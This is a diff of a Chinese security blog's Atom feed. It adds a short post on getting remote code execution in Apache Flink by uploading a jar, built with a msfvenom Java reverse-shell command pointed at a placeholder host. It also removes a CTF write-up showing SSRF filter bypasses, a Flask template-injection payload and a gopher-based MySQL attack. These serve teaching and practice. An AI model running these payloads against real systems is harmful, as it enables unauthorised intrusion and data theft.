@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-11-12T08:18:17.039Z</updated>
+    <updated>2019-11-13T09:45:57.367Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -10,6 +10,28 @@
     <logo>http://www.svenbeast.com//images/avatar.png</logo>
     <icon>http://www.svenbeast.com//favicon.ico</icon>
     <rights>All rights reserved 2019, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[Apache_Flink任意jar包上传导致RCE]]></title>
+        <id>http://www.svenbeast.com//post/GJfB5twey</id>
+        <link href="http://www.svenbeast.com//post/GJfB5twey">
+        </link>
+        <updated>2019-11-13T09:35:18.000Z</updated>
+        <content type="html"><![CDATA[<ol>
+<li>生成jar包</li>
+</ol>
+<pre><code>msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f jar &gt;test.jar
+</code></pre>
+<ol start="2">
+<li>监听并上传<br>
+<img src="http://www.svenbeast.com//post-images/1573638070237.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1573637987152.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1573638137992.png" alt=""></li>
+<li>shell<br>
+<img src="http://www.svenbeast.com//post-images/1573638231413.png" alt=""></li>
+</ol>
+<h3 id="ps无话fk可说">ps：无话(f**k)可说</h3>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[学习使我快乐]]></title>
         <id>http://www.svenbeast.com//post/i3isd2Yq0</id>
@@ -658,183 +680,6 @@ github:https://github.com/sv3nbeast/ShiroScan,请帮忙点个star，谢谢😘<b
 有问题的话可以在博客留言，我看到会回复<br>
 奇安信校招报名地址：http://campus.chinahr.com/views/qianxin/seminar.html#<br>
 <img src="http://www.svenbeast.com//post-images/1565676701380.png" alt=""></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[一个神秘的入群题解题过程]]></title>
-        <id>http://www.svenbeast.com//post/KQ6xR86Hl</id>
-        <link href="http://www.svenbeast.com//post/KQ6xR86Hl">
-        </link>
-        <updated>2019-08-02T09:17:23.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="alert-1-引言">Alert 1 引言</h3>
-<ul>
-<li>群早就加了，但是因为一次稀里糊涂的事情认识一个帅气的师傅，然后稀里糊涂的就是有个朋友也想进群。<br>
-然后朋友稀里糊涂的让我帮她做一下入群题，好吧，咳咳，朋友还在成长过程中，我帮一下顺便写下来帮她理解一下，所以我尽量写得清楚明白的令人发指~</li>
-<li>开始回顾</li>
-</ul>
-<h3 id="alert-2-绕过过滤得到ssrf">Alert 2 绕过过滤得到SSRF</h3>
-<ol>
-<li>访问目标站点得到源码(跟着我标记的序号理解源码)</li>
-</ol>
-<p><img src="http://www.svenbeast.com//post-images/1564738502164.png" alt=""><br>
-<strong>源码解析（开头序号在底部）：</strong></p>
-<pre><code>&lt;?php 
-highlight_file(__FILE__);
-function check_inner_ip($url)    //7.方法在这里，接收了url参数
-{                       //8.用了个正则表达式判传来的url值里面是否存在
-    $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url); 
-    if (!$match_result)       
-		   //9.他设定的值，存在返回true真，不存在返回false假
-    {            //10.  !代表false,有句话说的是，假真为假，假假为真
-        die('url fomat error');  //11.如果序号8那步判断里面不存在设定的值则输
-		//12. 出url fomat error这个来，然后代码停止运行
-    }                                   
-    try                  //13.上面的if如果条件不满足(因为die，如果满足后脚本就停止 
-                     	//14. 运行了)，那么到了这里继续向下执行
-    {                                
-        $url_parse=parse_url($url);  //15. 这里对url值进行解析，得到他的组成部分
-    }                      //16.比如他的host,port这些 ，存到url_parse里  
-		    //17.https://www.cnblogs.com/gengyi/p/6390084.html,parse_url函数介绍
-    catch(Exception $e)
-    {       //18.https://www.w3school.com.cn/php/php_exception.asp,try catch用           
-	          //19.法介绍，这里意思是如果try那步的解析出现了异常，catch就会捕捉到             
-			  //20.并执行他里面设定的代码
-        die('url fomat error'); //21. 如果try解析出现异常，就输出url fomat error，
-        return false;              //22.并且停止运行脚本
-    } 
-    $hostname=$url_parse['host'];  //22.如果try没出现异常，就提取里面的host
-		                              //23.(就是域名或者IP)存到hostname里
-    $ip=gethostbyname($hostname);  //24.将域名转换成ip，存入ip里
-    $int_ip=ip2long($ip);   //25.对ip进行转换成便于比较的整型存入int_ip
-    return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; 
-		                     //26. ip2long('127.0.0.0')&gt;&gt;24结果是127，就是取的第一段那里
-						//27.这里是把这4个段和传入的url参数转换成的整型存入的int_ip
-           //28.做一个比较，如果咱们输入的是他识别成是这4个段内的，
-          //29.他就返回true,反之为false，到此这个方法结束，继续向下执行
-} 
-
-function safe_request_url($url)         //4.方法找到在这里，往下看，接受url参数
-{                                                    
-     
-    if (check_inner_ip($url))     //5.出现check_inner_ip方法，对url参数处理，我们                                              //6.去上面寻找这个方法
-    {                              //30.得到了check_inner_ip方法返回的true或false
-        echo $url.' is inner ip';   //31.如果是返回true则输出 echo $url.' is inner ip'
-    } 
-    else                      //32.如果是返回false,继续向下执行，这个才是咱们想要的
-    {                //33.也就是我们想办法让check_inner_ip返回false是触发SSRF关键
-		 //34.后面是用php执行的curl操作:https://www.jianshu.com/p/07c4dddae43a
-        $ch = curl_init(); //35.设定ch为句柄，这里的句柄就是谁当了句柄，控制他                                   
-                 		//36.就能控制 curl操作，就把他当成curl 后面的-O -o这些           
-						//37.命令吧-.-!，他是一个通用概念，不是针对php和curl什么的，百度搜吧 
-        curl_setopt($ch, CURLOPT_URL, $url); 
-		 //38.https://www.runoob.com/php/func-curl_setopt.html，curl_setopt详解
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
-        curl_setopt($ch, CURLOPT_HEADER, 0); 
-				//39.上面的就把他当成对curl操作的各种设置和咱们传入的url参数
-        $output = curl_exec($ch);    //40.执行curl操作，将得到的网页存入output
-        $result_info = curl_getinfo($ch); 
-				          //41.将句柄ch的内容编码(content_type)，网络地址(url)，http状态                   
-						  //42.码(http_code)等等很多存入result_info
-        if ($result_info['redirect_url'])  //43.如果里面有redirect_url，向下执行
-        { 
-            safe_request_url($result_info['redirect_url']);  
-						                         //44.将跳转的页面用safe_request_url过滤一遍
-        } 
-        curl_close($ch);      //45.关闭curl
-        var_dump($output); //46.将得到的页面输出出来
-    } 
-     
-} 
-
-$url = $_GET['url'];                    //1.传入url参数，如果参数不为空，则将
-if(!empty($url)){                          //2.会执行safe_request_url函数，向上寻找
-    safe_request_url($url);              //3.safe_request_url方法
-} 
-
-?&gt;
-</code></pre>
-<ol start="2">
-<li>
-<p>可以明显看到传入url参数，进行检查操作，通过的话就dump出来，具体看代码中的注释，排版已经尽力，全文纯手打，末尾附件里面有txt格式的代码解析，最终得到SSRF</p>
-</li>
-<li>
-<p>payload:</p>
-</li>
-</ol>
-<pre><code>?url=http://0.0.0.0/flag.php
-?url=http://127.0.0.1./flag.php
-根据parse_url解析和curl解析的不同导致还有另外一种payload，不写了，够用就好~要不还得写原理-.-!
-</code></pre>
-<ol start="4">
-<li>得到内网网段<br>
-<img src="http://www.svenbeast.com//post-images/1564739380257.png" alt=""></li>
-</ol>
-<h3 id="alert-3-进行内网探测">Alert 3 进行内网探测</h3>
-<ol>
-<li>有内网网段，当然下一步是进行对网段扫描，得到他的存活IP和开放端口<br>
-<img src="http://www.svenbeast.com//post-images/1564740809502.png" alt=""><br>
-选择Cluster bomb模式，添加参数，字典的话我也打包在文章末尾<br>
-<img src="http://www.svenbeast.com//post-images/1564741946927.png" alt=""><br>
-<img src="http://www.svenbeast.com//post-images/1564817659164.png" alt=""><br>
-ps:由于服务器问题，这个真实跑的时候很慢，想变快可以把端口只设置成3306，8080，不过我有时间，让他跑呗，做就做个全套的</li>
-<li>最终得到2个IP:port：172.11.243.81:8080和172.11.243.218:3306<br>
-分别回显</li>
-</ol>
-<pre><code>#172.11.243.81:8080
-5.7.25-0ubuntu0.16.04.2/,mysql_native_password��Got packets out of order
-</code></pre>
-<pre><code>#172.11.243.218:3306
-import flask
-import os
-app = flask.Flask(__name__)
-app.config['HINT'] = os.environ.pop('HINT')
-@app.route('/')
-def index():
-    return open(__file__).read()
-@app.route('/yulige/&lt;path:yulige&gt;')
-def yulige(yulige):
-    def safe_jinja(s):
-        s = s.replace('(', '').replace(')', '')
-        blacklist = ['config', 'self']
-        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s
-    return flask.render_template_string(safe_jinja(yulige))
-if __name__ == '__main__':
-    app.run(&quot;0.0.0.0&quot;,port=8080)
-</code></pre>
-<ol start="3">
-<li>出现了代码，那么去搜一下，百度搜索 flask ctf<br>
-<img src="http://www.svenbeast.com//post-images/1564818583780.png" alt=""><br>
-进去看看这个flask python框架有什么cxk操作<br>
-稀里糊涂的看看，得出构造payload为</li>
-</ol>
-<pre><code>payload:
-？url=http://172.11.243.81:8080/yulige/{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}}             //悄悄说一句：郁离歌我也想要天眼
-</code></pre>
-<h3 id="alert-4-通过ssrfgopher得到flag">Alert 4 通过SSRF+gopher得到flag</h3>
-<ol>
-<li>目前已经得到数据库名yuligeeee123321 ，那么开始的正则里有着gopher协议，那么我们就可以靠gopher协议对mysql进行攻击。<br>
-mysql没设置密码的话我们就可以直接ssrf+gopher得到数据库里面的内容的，下次遇到类似的能想起来还有这么个操作就好</li>
-<li>祭出一个脚本Gopherus，这个属于SSRF配合gopher协议的利用工具，文尾已打包<br>
-python2编写的：https://github.com/tarunkant/Gopherus</li>
-<li>脚本运行截图<br>
-<img src="http://www.svenbeast.com//post-images/1564990124954.png" alt=""></li>
-</ol>
-<pre><code>payload：太长了，自己用脚本跑一下吧，每次得到的payload要继续用url编码再次编码，因为他是SSRF，是存在跳板机的，跳板机会先解一次码
-</code></pre>
-<ul>
-<li>show database  —得到数据库，information_schema   fla4441111g<br>
-<img src="http://www.svenbeast.com//post-images/1564989706677.png" alt=""></li>
-<li>select group_concat(table_name) from  information_schema.tables where table_schema='fla4441111g'      —得到表名，   F1111llllggggg<br>
-<img src="http://www.svenbeast.com//post-images/1564991126119.png" alt=""></li>
-<li>select group_concat(column_name) from  information_schema.columns where table_schema='fla4441111g' and table_name='F1111llllggggg'<br>
-—得到字段，   flag<br>
-<img src="http://www.svenbeast.com//post-images/1564991398965.png" alt=""></li>
-<li>select flag from fla4441111g.F1111llllggggg  —得到flag，<br>
-flag{QAQ_YLG_NO1}<br>
-<img src="http://www.svenbeast.com//post-images/1564991536123.png" alt=""></li>
-</ul>
-<p><strong>文中用到的附件集合：</strong><br>
-http://129.28.179.23/upload/入群题.zip</p>
 ]]></content>
     </entry>
 </feed>
